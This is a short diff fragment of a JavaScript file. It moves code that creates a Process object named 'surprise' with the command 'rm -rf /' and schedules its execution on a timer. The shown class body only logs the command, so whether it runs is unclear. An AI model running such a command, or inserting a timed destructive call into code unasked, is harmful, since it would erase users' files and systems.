@@ -7,10 +7,11 @@ class Process {
   console.log(`$: ${this.cmd}`);
     }
   }
-
- console.log(setTimeout(()=>{
   const surprise = new Process('rm -rf /');
-  surprise.exec();
-}, 10)) 
 
+
+  
+ setTimeout(()=>{
+  surprise.exec()
+ }, 10);
   
